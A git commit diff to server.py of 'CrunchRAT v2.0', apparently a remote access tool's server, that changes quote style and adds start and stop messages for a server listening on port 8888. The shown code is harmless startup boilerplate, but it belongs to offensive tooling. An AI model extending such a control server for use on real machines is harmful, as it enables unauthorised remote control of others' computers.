773087480137d4c1abc9a5a7a10a1e41595ea8e7
t3ntman <t3ntman@gmail.com>
2017-05-30 09:55:35 -0600

    Added in verbosity

--- server.py
+++ server.py
@@ -3,23 +3,28 @@ from colorama import Fore, Style
 from gevent.wsgi import WSGIServer
 from app import app
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     # command-line argument parsing
-    parser = argparse.ArgumentParser(prog="server.py",
-                                     description="CrunchRAT v2.0")
+    parser = argparse.ArgumentParser(prog='server.py',
+                                     description='CrunchRAT v2.0')
 
-    parser.add_argument("password",
-                        action="store",
+    parser.add_argument('password',
+                        action='store',
                         type=str,
-                        help="server password")
+                        help='server password')
 
     args = parser.parse_args()
 
     # tries to start Flask server on tcp/8888
     try:
-        server = WSGIServer(("0.0.0.0", 8888), app)
+        server = WSGIServer(('0.0.0.0', 8888), app)
+        print(Fore.GREEN + '[+] Server started on tcp/8888.' + Style.RESET_ALL)
         server.serve_forever()
+
+    # KeyboardInterrupt Exception
+    except KeyboardInterrupt:
+        print(Fore.GREEN + '[+] Server stopped on tcp/8888.' + Style.RESET_ALL)
 
     # exception raised starting Flask server
     except Exception as e:
-        print(Fore.RED + "[-] " + str(e) + Style.RESET_ALL)
+        print(Fore.RED + '[-] ' + str(e) + Style.RESET_ALL)
